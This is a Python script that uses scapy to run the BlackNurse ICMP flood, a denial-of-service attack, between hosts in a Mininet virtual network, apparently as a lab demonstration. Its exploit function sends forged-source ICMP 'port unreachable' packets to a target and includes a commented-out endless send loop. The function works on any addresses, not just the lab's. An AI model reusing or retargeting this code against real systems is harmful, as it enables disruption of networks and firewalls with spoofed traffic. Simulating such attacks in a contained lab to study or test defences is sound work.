#!/usr/bin/env python
# -*- coding: utf-8 -*-

from scapy.all import *
from os import geteuid
from sys import argv, exit

from mininet.net import Mininet
from mininet.topo import SingleSwitchTopo

def exploit(source, target, iface=None):
    # from https://github.com/opsxcq/exploit-blacknurse/blob/master/exploit.py
    """BlackNurse attack"""

    print("[*] Starting BlackNurse attack from " + source + " to " + target)
    socket = conf.L2socket(iface=(conf.iface if not iface else iface))
    packets=[]
    for i in xrange(1,100):
        packets.append(IP(dst=target,src=source)/ICMP(type=3,code=3))

    # while True:
    #     sendp(packets)
    sendp(packets)


if __name__ == "__main__":

    if not geteuid() == 0:
        exit("[!] Must be run as sudo")

    nodes = 3

    print("[*] Starting single switch Mininet topology with %d nodes" % nodes)

    topology = SingleSwitchTopo(k=nodes)
    net = Mininet(topo=topology)
    net.start()

    h1, h2, h3  = net.hosts[0], net.hosts[1], net.hosts[2]
    # help(h1)

    print("Hosts:")
    for h in net.hosts:
        print(str(h) + " - " + h.IP())
        print h1.cmd('ping -c4 %s' % h.IP())

    try:
        exploit(h2.IP(), h1.IP())
    # except IOError:
    #     exit("[!] Error sending packets")
    except KeyboardInterrupt:
        print("\n[*] Stopping BlackNurse attack")

    net.stop()
    